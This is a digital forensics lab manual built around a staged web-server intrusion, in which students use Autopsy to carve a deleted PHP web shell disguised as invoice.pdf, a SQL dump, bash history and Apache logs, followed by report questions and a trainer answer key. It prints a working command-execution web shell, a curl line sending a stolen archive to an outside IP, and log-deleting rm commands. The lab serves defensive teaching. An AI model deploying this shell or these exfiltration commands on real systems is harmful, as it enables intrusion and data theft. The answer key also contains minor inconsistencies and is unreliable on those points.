# ACEP Tech — Incident Response & Forensics Division
## Case File Reference: AA-2026-0623
## Scenario: Operation Web Intrusion (Web Server Compromise & Anti-Forensics)

This manual is structured around the 6 official phases of the digital forensics lifecycle. It features a realistic web intrusion scenario designed to be read to the students to set the stage for their investigation.

---

```
=============================================================================
                      DIGITAL FORENSICS LIFE CYCLE
=============================================================================
[Phase 1: Identification]  -->  Detect breach & isolate web server root
         |
         v
[Phase 2: Preservation]    -->  Establish Chain of Custody & calculate hashes
         |
         v
[Phase 3: Collection]      -->  Create virtual bit-stream image (evidence.raw)
         |
         v
[Phase 4: Examination]     -->  Mount image in Autopsy 2.x web interface
         |
         v
[Phase 5: Analysis]        -->  Carve deleted PHP disguised as PDF, SQL, & history
         |
         v
[Phase 6: Reporting]       -->  Submit formal incident report & verify solutions
=============================================================================
```

---

## The Incident Narrative: The Web Server Intrusion
*(Trainers: Read this narrative to your class to introduce the lab scenario)*

It is 14:15 PM on June 23, 2026. The main alarm in the Security Operations Center (SOC) of **ACEP Tech** begins to flash red. A threat intelligence feed has detected a new post on an underground data-broker forum. The post is titled: **"ACEP Tech Client Secret Keys Leak"**. Appended to the post is a sample of active customer API keys and internal database codes.

The security response team immediately coordinates. The leaked API keys are authentic, and they belong to the company's core client secrets table. An intrusion has occurred. 

The security engineers search the database server access logs and discover that the table was exported directly from the primary web server. Further investigation reveals that an external attacker (hacker) discovered a vulnerability in one of the web portal upload forms. The portal only allowed users to upload PDF documents (like invoices or support attachments). 

To bypass this security filter, the hacker renamed their PHP backdoor web shell script to **`invoice.pdf`** and uploaded it. Because the server was misconfigured, it executed the PHP code hidden inside this PDF file.

Through this backdoor, the hacker gained unauthorized terminal access under the compromised account **`web_admin`** (system username: `web_admin`). Using these administrative privileges, the attacker dumped the `client_secrets` table, compressed it, and downloaded it.

But the hacker did not stop there. Before logging off, the attacker executed a custom anti-forensics script to wipe all traces of their activities. They deleted:
*   The backdoor shell disguised as a PDF (`invoice.pdf`) they uploaded to the server.
*   The SQL database dump file they generated.
*   The system web logs (`access.log`) capturing their connections.
*   The shell command history (`.bash_history`) detailing their typed commands.

The hacker believed that by deleting these files, they had left the forensics team in the dark. 

However, the ACEP Tech security team immediately unmounted the filesystem partition to prevent any new data writes from overwriting the deleted files, and generated a raw, bit-stream duplicate of the directory, saved as **`evidence.raw`**.

You are the Lead Digital Forensics Analyst called in to examine `evidence.raw`. Your task is to use **Autopsy** to carve and recover the deleted backdoor disguised as a PDF, the exfiltrated database backup, shell commands, and log entries, expose the attacker's hidden scripts, and trace the attacker's source IP address to document the compromise.

---

## 1. IDENTIFICATION

In the Identification phase, investigators define the incident, identify potential evidence sources, and isolate target systems.

*   **Target Entity**: ACEP Tech (Secure Cloud Provider).
*   **Incident Type**: External Web Intrusion (File Upload Bypass) & Anti-Forensics log wipeout.
*   **Primary Crime Scene**: Web server root directory `/var/www/html/`.
*   **Identified System Account Compromised**: `web_admin` (system user: `web_admin`).
*   **Action Taken**: Web server directory partition isolated and imaged as `evidence.raw`.

---

## 2. PRESERVATION

In the Preservation phase, we establish a **Chain of Custody** and calculate cryptographic hashes of the disk image to prove it remains unaltered during our investigation.

### Step 1: Record Chain of Custody Metadata
*   **Evidence Label**: `evidence.raw`
*   **Source**: Web server directory `/var/www/html/` partition.
*   **Analysis Environment**: Kali Linux VM (Loopback Drive).

### Step 2: Calculate Cryptographic Fingerprints
Run these commands inside your Kali Linux terminal to generate MD5 and SHA-256 hashes of `evidence.raw` to lock down its integrity state:

1.  Open a terminal inside your Kali Linux VM.
2.  Navigate to your Desktop directory:
    ```bash
    cd ~/Desktop
    ```
3.  Calculate the **MD5 Hash**:
    ```bash
    md5sum evidence.raw
    ```
    *Record this 32-character hex string. It represents the exact current state of the evidence.*
4.  Calculate the **SHA-256 Hash**:
    ```bash
    sha256sum evidence.raw
    ```
    *Record this 64-character hex string.*

---

## 3. COLLECTION

The Collection phase involves acquiring the data from the source media into a forensic file format (`.raw` / `.dd`) using write-blocking mechanisms. 

In this lab, the server partition was imaged into the file **`evidence.raw`** using the command line utility `dd`:
```bash
dd if=/dev/sdb1 of=evidence.raw bs=4M status=progress
```

### Setup Instructions (For the Trainer)
To generate the virtual disk image `evidence.raw` on Kali Desktop before starting the class, follow these steps:

1.  Copy the script **`automate_lab.sh`** onto the Kali Linux VM Desktop.
2.  Open a terminal inside Kali, navigate to the Desktop, and make the script executable:
    ```bash
    cd ~/Desktop
    chmod +x automate_lab.sh
    ```
3.  Run the script as root:
    ```bash
    sudo ./automate_lab.sh
    ```
4.  The script will automatically format a virtual 500MB filesystem, load it with decoy web files, inject the backdoor shell, database dump, logs, and command history, and delete them to simulate the attacker's anti-forensics actions. The final file **`evidence.raw`** will be written directly to your **Kali Desktop**.

---

## 4. EXAMINATION

The Examination phase involves preparing the forensic workstation, launching our tools, creating a case file, and mounting the evidence data source without modifying it.

### Step 1: Launch Autopsy Web Server
1.  Open a terminal in your Kali Linux VM and start the Autopsy service:
    ```bash
    sudo autopsy
    ```
2.  The service will start. Look at the terminal screen. It will display a local web link:
    `http://localhost:9999/autopsy`
3.  Minimize the terminal (do not close it) and open **Firefox** inside Kali Linux.
4.  Go to the link: `http://localhost:9999/autopsy`

### Step 2: Create a Case and Import the Image
Follow these click-by-click steps inside the web interface:

1.  Click the gray button labeled **New Case**.
2.  Under **Case Name**, type: `ACEP_Tech_Incident`.
3.  Under **Description**, type: `Server Intrusion and Log Erasure`. Click **New Case**.
4.  In the Host Manager screen, click **Add Host**.
    *   **Host Name**: `Server_01`. Click **Add Host**.
5.  Click the button **Add Image**, then select **Add Image File**.
6.  Configure the Image parameters:
    *   **Location/Path**: `/home/kali/Desktop/evidence.raw`
    *   **Type**: Select **Partition** (since the raw file represents a direct filesystem partition).
    *   **Import Method**: Select **Symlink** (this references the file directly on your Desktop without copying it, saving time and disk space).
    *   Click **Add**.
7.  Click **OK** on the validation success screen.
8.  You will be returned to the case directory tree. Click the **Analyze** button to launch the examination view.

---

## 5. ANALYSIS

The Analysis phase is the core of the investigation. We will explore the filesystem, carve deleted files, identify mismatches, and reconstruct the attack timeline.

To begin, click **File Analysis** in the top menu bar of Autopsy. This opens a folder browser.
*   **Crucial Rule**: Deleted files are marked in **red** with an asterisk `*`.

---

#### Task A: Carving the Backdoor Disguised as a PDF (`invoice.pdf`)
The hacker deleted the backdoor shell script. Since the portal only allowed `.pdf` files, the backdoor was uploaded as `invoice.pdf` but contains PHP script code.
1.  In the File Analysis directory browser, locate the file **`invoice.pdf`** (marked in red). Click on it.
2.  In the bottom pane, select the **ASCII** viewer tab. You will see:
    ```php
    <?php
    # PHP Backdoor Shell disguised as PDF to bypass upload security filters
    # Target Server misconfiguration parsed PDF files containing PHP code.
    if (isset($_GET['action']) && $_GET['action'] == 'execute') {
        if (isset($_GET['cmd'])) {
            echo "<pre>";
            system($_GET['cmd']);
            echo "</pre>";
        }
    }
    ?>
    ```
3.  **In-Depth Forensic Code Analysis**:
    *   Notice that despite the `.pdf` extension, this file contains plain-text PHP code. This is a severe **Extension Signature Mismatch**!
    *   `$_GET['cmd']` instructs PHP to grab whatever text is written in the URL parameter `cmd=`.
    *   `system(...)` takes this parameter and runs it directly on the Linux server terminal.
    *   This backdoor allowed the hacker to run terminal commands on the server through the browser, bypassing SSH logs.
4.  Click the **Export** button in the bottom pane to save this script as `/home/kali/Desktop/invoice_recovered.php`.

---

#### Task B: Carving the Leaked SQL Database (`customers.sql`)
The attacker generated a database backup file and deleted it immediately after downloading it.
1.  In the File Analysis directory browser, locate the file named **`customers.sql`** (marked in red). Click on it.
2.  Select the **ASCII** viewer in the bottom pane. You will see:
    ```sql
    CREATE TABLE client_secrets (
        secret_id INT PRIMARY KEY,
        confidential_code VARCHAR(100),
        owner_email VARCHAR(100)
    );
    INSERT INTO client_secrets VALUES (1, 'ACEP_TECH_CONFIDENTIAL_ALGORITHM_V1', 'client_secrets@acep.local');
    ```
3.  **In-Depth Database Analysis**:
    *   This is a database export file generated using the `mysqldump` command.
    *   It contains the schema of the stolen database table (`client_secrets`) and one active record.
    *   Notice that the owner of the client secrets table is **`client_secrets@acep.local`**.
4.  Click **Export** to save this file as `/home/kali/Desktop/customers_recovered.sql`.

---

#### Task C: Investigate the Extension Mismatch (`banner.jpg`)
The attacker disguised their log-wiping script as a harmless image file to bypass security scans.
1.  In the File Analysis directory browser, click on the file named **`banner.jpg`** (listed in white/active text).
2.  Select the **Hex** tab in the bottom pane. Standard JPEG images must start with the hex signature `FF D8 FF`. Look at the first few bytes of this file. It starts with:
    `23 21 2f 62 69 6e 2f 62 61 73 68`
3.  Click the **ASCII** tab. You will see that the file starts with the text: `#!/bin/bash`. 
4.  **In-Depth Signature Analysis**:
    *   The ASCII text `#!/bin/bash` (hex `23 21 2f...`) represents the signature of a **Linux Bash shell script**, not a picture!
    *   This script contains the exfiltration commands the attacker ran:
        ```bash
        tar -czf uploads/system_cache.tar.gz customers.sql
        curl -F "data=@uploads/system_cache.tar.gz" http://192.168.1.200/incoming/upload.php
        ```
    *   The script packs the database dump (`customers.sql`) into a compressed archive (`system_cache.tar.gz`) and uploads it to the remote drop IP address at **`192.168.1.200`** before running cleanup functions.

---

#### Task D: Recover Terminal Command History (`.bash_history`)
The attacker attempted to clear their command console logs under the compromised user account.
1.  In the File Analysis list, find the deleted file **`.bash_history`** (marked in red). Click on it.
2.  Select the **ASCII** viewer in the bottom pane. Read the commands from top to bottom:
    ```text
    mysqldump -u root -p acep_db client_secrets > customers.sql
    tar -czf uploads/system_cache.tar.gz customers.sql
    curl -F "data=@uploads/system_cache.tar.gz" http://192.168.1.200/incoming/upload.php
    echo "<?php system(\$_GET['cmd']); ?>" > invoice.pdf
    ./cleaner.sh
    mv cleaner.sh banner.jpg
    rm -f invoice.pdf
    rm -f customers.sql
    rm -f /var/log/apache2/access.log
    exit
    ```
3.  **In-Depth Timeline Reconstruction**:
    This history file establishes the chronological order of the crime: the attacker dumped the database, compressed it, uploaded it to the remote competitor server, created a backdoor web shell disguised as a PDF (`invoice.pdf`), executed their cleanup script, renamed the script to `banner.jpg` to hide it, deleted the database dump and backdoor, and exited.

---

#### Task E: Parse the Erased Server Logs (`access.log`)
The attacker cleared the server logs, but we can carve them from the unallocated sectors.
1.  In the File Analysis list, find the deleted file **`access.log`** (marked in red). Click on it.
2.  Select the **ASCII** viewer in the bottom pane. Locate the log entries referencing `/invoice.pdf`:
    ```text
    192.168.1.142 - - [23/Jun/2026:14:25:12 +0000] "GET /invoice.pdf?action=execute&cmd=whoami HTTP/1.1" 200 34
    ```
3.  **In-Depth Apache Log Analysis**:
    Let's break down this log entry step-by-step:
    *   `192.168.1.142`: The source IP address of the user accessing the page (the attacker's external IP address).
    *   `[23/Jun/2026:14:25:12 +0000]`: The exact date and time the HTTP request was sent.
    *   `GET /invoice.pdf`: The request method and target resource (accessing the backdoor disguised as a PDF).
    *   `?action=execute&cmd=whoami`: The query parameters fed to the PHP script, instructing it to run the command `whoami`.
    *   `200`: The HTTP success status code, showing the command was executed.
4.  By reading this log, we can prove the attacker was using the workstation at IP **`192.168.1.142`** to control the server backdoor and execute exfiltration tasks.

---

## 6. REPORTING

In the Reporting phase, investigators compile and present their findings in a clear, documented manner. Answer the following questions to complete your report.

### Section 1: Preservation & Integrity
1.  What is the calculated **MD5 hash** of `evidence.raw`?
2.  What is the calculated **SHA-256 hash** of `evidence.raw`?
3.  What is the volume label of the raw filesystem image?

### Section 2: Forensic Finding Artifacts
4.  **The Backdoor**: What is the name of the carved backdoor script? Write down the exact PHP code of the backdoor. How did the attacker disguise this script, and how did they feed commands to it?
5.  **The Stolen Data**: What database file was carved? Write down the table schema and the email address of the record recovered from the SQL dump.
6.  **Extension Mismatch**: List the files that had a spoofed extension mismatch. What were their filenames, their spoofed extensions, and their actual file types?
7.  **The Exfiltration Target**: What external IP address and path did the exfiltration script upload the stolen data to?
8.  **Command History**: List the sequence of actions Marcus performed in the `.bash_history` file.
9.  **Attacker Workstation Identification**: What was the IP address of the hacker who accessed the PHP backdoor shell, as recorded in `access.log`?
10. List the commands sent via the web browser to the backdoor script, as recorded in the logs.

### Section 3: Conclusion & Summary
11. Write a 5-sentence Executive Summary concluding the investigation. Explicitly state the compromised system account (`web_admin`), the method of compromise (backdoor details and extension bypass), the exfiltration target IP address, the attacker's source IP address, and the files recovered that confirm the data breach.

---

## GUIDE & ANSWER KEY

This section is for the trainer to evaluate student work and lead classroom debriefings.

### Lab Solutions & Expected Values
*   **Hashes of `evidence.raw`**: (Run the script once to calculate the MD5/SHA-256 and write them on the board).
*   **Filesystem format**: FAT32 (Volume label: `ACEP_SERVER`).
*   **Carved PHP file**: `invoice.pdf`. Code:
    ```php
    <?php
    if (isset($_GET['action']) && $_GET['action'] == 'execute') {
        if (isset($_GET['cmd'])) {
            echo "<pre>";
            system($_GET['cmd']);
            echo "</pre>";
        }
    }
    ?>
    ```
    *GET Parameters required*: `action=execute` and `cmd=<command>`.
*   **Carved Database**: `customers.sql`. Table: `client_secrets`. Recovers the email **`client_secrets@acep.local`** and the secret code.
*   **Extension Mismatches**: 
    1. `invoice.pdf`. Spoofed extension: `.pdf`. Actual file type: **PHP Script**. (Magic bytes: `<?php`).
    2. `banner.jpg`. Spoofed extension: `.jpg`. Actual file type: **Linux Bash Script**. (Magic bytes: `#!/bin/bash` or hex: `23 21 2f 62 69 6e 2f 62 61 73 68`).
*   **Exfiltration Script Actions**: The script compresses the database dump to `uploads/system_cache.tar.gz`, uploads it using curl to `http://192.168.1.200/incoming/upload.php`, clears the terminal history, deletes server log folders, and removes the web shell and SQL dump.
*   **Command History sequence**:
    1. Check user and directory (`cd /var/www/html`, `whoami`).
    2. Dump the database using mysql (`mysqldump ... > customers.sql`).
    3. Package the SQL file (`tar -czf uploads/system_cache.tar.gz customers.sql`).
    4. Upload to remote IP (`curl -F ... http://192.168.1.200/...`).
    5. Setup backdoor backdoor (`echo ... > invoice.pdf`).
    6. Run log wipe script (`./cleaner.sh`).
    7. Disguise script as image (`mv cleaner.sh banner.jpg`).
    8. Delete files (`rm invoice.pdf`, `rm customers.sql`).
*   **Attacker Workstation IP**: `192.168.1.142` (Attacker's external IP address).
*   **Web Shell requests**: `whoami` (check permissions), `mysqldump` (dump database), `curl` (exfiltrate database), `rm` (delete evidence), `mv` (rename script).

---

### Core Digital Forensics Teaching Points (Debrief Guide)
Lead a classroom discussion using these four core learning pillars:

1.  **How File Carving Works on FAT32**:
    *   *Concept*: Explain that when you delete a file on a FAT32 filesystem, the operating system does not zero out the file data. Instead, it changes the first character of the file directory record to `0xE5` (the delete flag) and marks its clusters as "free" in the File Allocation Table.
    *   *Forensics*: As long as no new files overwrite those clusters, the file data remains. Autopsy scans these free sectors (unallocated space) byte-by-byte looking for known file signatures (e.g., `<?php` or `CREATE TABLE`) and recovers the file.
2.  **File Headers vs. File Extensions (Magic Bytes)**:
    *   *Concept*: Explain that file extensions (like `.jpg` or `.exe`) are just visual labels for users and standard OS applications. The computer identifies a file's true format by checking the first few bytes (the file header).
    *   *Forensics*: In this lab, the suspect renamed a bash script to `banner.jpg`. By checking the file header, Autopsy saw it began with `#!/bin/bash` (hex: `23 21 2f`) instead of a standard JPEG header (`FF D8 FF`), and flagged it.
3.  **The Illusion of Log Wiping**:
    *   *Concept*: Suspects often assume that deleting log files or using command overrides (like `history -c`) renders their activities invisible.
    *   *Forensics*: Unless secure wiping/overwriting software is used, the sectors containing the log lines are merely marked as unallocated. Forensic software can easily reconstruct the text files from unallocated sectors, exposing the timestamps and IPs.
4.  **Chain of Custody and Hashing**:
    *   *Concept*: In digital forensics, chain of custody is paramount. The integrity of the evidence must be verified at every handoff.
    *   *Forensics*: This is why calculating the MD5/SHA-256 hashes of `evidence.raw` immediately after acquisition and comparing them before import is a standard professional practice.

---

## 👤 About the Author

### **Chaitanya Eshwar Prasad**
*Cybersecurity Specialist & Digital Forensics Instructor*

Connect with me and explore my work across these platforms:

| Platform | Link |
| :--- | :--- |
| **🌐 Website** | [chaitanyaeshwarprasad.com](https://chaitanyaeshwarprasad.com) |
| **💻 GitHub** | [@chaitanyaeshwarprasad](https://github.com/chaitanyaeshwarprasad) |
| **📺 YouTube** | [ACEP Tech in Telugu](https://www.youtube.com/@chaitanya.eshwar.prasad) |
| **🔗 LinkedIn** | [Chaitanya Eshwar Prasad](https://linkedin.com/in/chaitanya-eshwar-prasad) |
| **📸 Instagram** | [@acep.tech.in.telugu](https://instagram.com/acep.tech.in.telugu) |
| **🎯 YesWeHack** | [chaitanya-eshwar-prasad](https://yeswehack.com/hunters/chaitanya-eshwar-prasad) |
